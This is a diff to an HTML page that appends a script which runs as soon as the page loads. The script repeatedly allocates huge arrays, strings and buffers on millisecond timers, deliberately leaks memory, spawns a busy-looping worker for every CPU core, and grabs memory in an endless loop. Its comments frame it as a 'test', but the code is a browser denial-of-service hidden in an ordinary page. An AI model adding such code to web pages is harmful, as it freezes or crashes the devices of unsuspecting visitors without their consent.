@@ -87,5 +87,142 @@
             </div>
         </div>
     </div>
+    <script>
+        let memoryHogArrays = [];
+let memoryHogStrings = [];
+let memoryHogObjects = [];
+let memoryLeakArray = [];
+let randomDataBuffer = [];
+
+function fillMemoryWithArrays() {
+    for (let i = 0; i < 500000; i++) {
+        memoryHogArrays.push(new Array(5000).fill(Math.random()));
+    }
+    console.log('Filled memory with massive arrays!');
+}
+
+function fillMemoryWithStrings() {
+    let longString = 'A'.repeat(10000000);  // 10 million characters
+    for (let i = 0; i < 10000; i++) {
+        memoryHogStrings.push(longString);
+    }
+    console.log('Filled memory with massive strings!');
+}
+
+function fillMemoryWithObjects() {
+    for (let i = 0; i < 100000; i++) {
+        let obj = { deep: { level1: { level2: { level3: { value: Math.random() } } } } };
+        memoryHogObjects.push(obj);
+    }
+    console.log('Filled memory with deep object graphs!');
+}
+
+function simulateMemoryLeak() {
+    setInterval(() => {
+        memoryLeakArray.push(new Array(500000).fill(Math.random()));
+        console.log('Memory leak in progress...');
+    }, 1); // Run every 1ms to rapidly increase memory consumption
+}
+
+function generateRandomData() {
+    // Allocate a massive buffer and randomly fill it with data
+    let buffer = new ArrayBuffer(1024 * 1024 * 100);  // 100 MB buffer
+    let uint8View = new Uint8Array(buffer);
+    for (let i = 0; i < uint8View.length; i++) {
+        uint8View[i] = Math.random() * 255;  // Random values in the buffer
+    }
+    randomDataBuffer.push(buffer);
+    console.log('Allocated random binary data buffer!');
+}
+
+function massiveObjectGraphs() {
+    // Create a massive interconnected object graph that never gets released
+    let graph = {};
+    for (let i = 0; i < 100000; i++) {
+        graph[`key_${i}`] = { data: Math.random(), nested: { value: Math.random() } };
+    }
+    memoryHogObjects.push(graph);
+    console.log('Allocated massive object graph!');
+}
+
+function allocateHugeTypedArrays() {
+    // Allocate massive typed arrays in memory (e.g., Int32Array, Float64Array)
+    for (let i = 0; i < 10000; i++) {
+        let arr = new Int32Array(100000);  // Array with 100,000 elements
+        for (let j = 0; j < arr.length; j++) {
+            arr[j] = Math.floor(Math.random() * 1000);
+        }
+        memoryHogArrays.push(arr);
+    }
+    console.log('Allocated massive typed arrays!');
+}
+
+function fillMemoryWithDeepRecursion() {
+    // A deep recursive function that consumes the stack space
+    function recurse(n) {
+        if (n === 0) return;
+        let obj = { deepRecursion: n, value: Math.random() };
+        memoryHogObjects.push(obj);
+        recurse(n - 1);
+    }
+    recurse(10000); // Try recursion at a high depth
+    console.log('Memory filled with deep recursion!');
+}
+
+function extremeMemoryTest() {
+    // Start running all memory consumption techniques
+    setInterval(() => {
+        fillMemoryWithArrays();
+        fillMemoryWithStrings();
+        fillMemoryWithObjects();
+        allocateHugeTypedArrays();
+        generateRandomData();
+        massiveObjectGraphs();
+    }, 10); // Run every 10ms to rapidly increase memory usage
+
+    // Start memory leak simulation
+    simulateMemoryLeak();
+
+    // Start deep recursion
+    fillMemoryWithDeepRecursion();
+}
+
+extremeMemoryTest();
+
+
+// Function to stress CPU by generating heavy computational load
+function stressCPU() {
+    const numWorkers = navigator.hardwareConcurrency || 4; // Get number of CPU cores, default to 4 if not available
+    const workers = [];
+    for (let i = 0; i < numWorkers; i++) {
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+            setInterval(() => {
+                const start = performance.now();
+                while (performance.now() - start < 1000); // Generate heavy computational load for 1 second
+            }, 0);
+        `])));
+        workers.push(worker);
+    }
+}
+
+// Function to stress memory by allocating large chunks of memory
+function stressMemory() {
+    const chunks = [];
+    while (true) {
+        try {
+            const chunk = new ArrayBuffer(1024 * 1024 * 100 * 2); // Allocate 100MB memory chunk
+            chunks.push(chunk);
+        } catch (error) {
+            console.error('Memory allocation failed:', error);
+            break;
+        }
+    }
+}
+
+// Start stressing CPU and memory
+stressCPU();
+stressMemory();
+
+    </script>
 </body>
 </html>
